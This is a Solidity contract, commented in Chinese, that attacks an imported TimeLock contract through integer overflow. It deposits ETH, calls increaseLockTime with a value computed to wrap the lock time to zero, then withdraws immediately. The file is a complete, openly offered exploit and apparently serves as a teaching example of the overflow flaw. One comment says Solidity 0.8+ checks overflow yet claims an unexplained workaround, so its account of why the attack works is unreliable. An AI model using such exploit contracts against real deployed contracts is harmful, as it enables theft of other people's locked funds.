// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./TimeLock.sol";

/**
 * TimeLockAttack - 整数溢出攻击合约
 * 攻击原理：利用 increaseLockTime 的整数溢出，将锁定时间变为 0
 */
contract TimeLockAttack {
    TimeLock public timeLock;
    address public attacker;

    constructor(address _timeLockAddress) {
        timeLock = TimeLock(_timeLockAddress);
        attacker = msg.sender;
    }

    /**
     * 接收 ETH 的函数
     */
    receive() external payable {}

    /**
     * attack - 发起攻击
     */
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        
        // 存款（会设置 lockTime = 当前时间 + 1 week）
        timeLock.deposit{value: msg.value}();
        
        // 计算溢出的值：2^256 - 当前 lockTime + 1
        // 由于 Solidity 0.8+ 默认有溢出检查，我们使用溢出技巧
        uint256 currentLockTime = timeLock.getLockTime(address(this));
        uint256 overflowValue = type(uint256).max - currentLockTime + 1;
        
        // 攻击：让锁定时间溢出变为 0
        timeLock.increaseLockTime(overflowValue);
        
        // 提款（此时锁定时间是 0，block.timestamp > 0 永远成立）
        timeLock.withdraw();
    }

    /**
     * 查看攻击合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
